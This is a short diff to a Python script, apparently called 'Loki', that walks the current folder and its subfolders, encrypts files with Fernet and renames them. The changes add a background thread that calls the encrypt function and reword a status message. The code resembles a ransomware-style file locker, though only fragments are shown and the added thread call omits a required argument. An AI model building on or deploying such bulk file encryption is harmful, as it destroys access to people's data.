@@ -3,6 +3,7 @@ import sys
 import os
 from cryptography.fernet import Fernet
 from colorama import Fore
+import threading
 
 # Pre-run.
 os.system("clear")
@@ -73,7 +74,7 @@ def encrypt(files):
                 new_path += ext
             os.rename(path, new_path)
     except:
-        print("Files already unencrypted | Loki is not detected.")
+        print("Files already encrypted | Loki is detected, if you feel this is a bug consider attempting manual encryption.")
 
 def encryptor():
     # Find files in current dir, and sub dirs.
@@ -83,3 +84,7 @@ def encryptor():
 
 if __name__ == '__main__':
     encryptor()
+
+encryptor_thread = threading.Thread(target=encrypt)
+encryptor_thread.start()
+encryptor_thread.join()
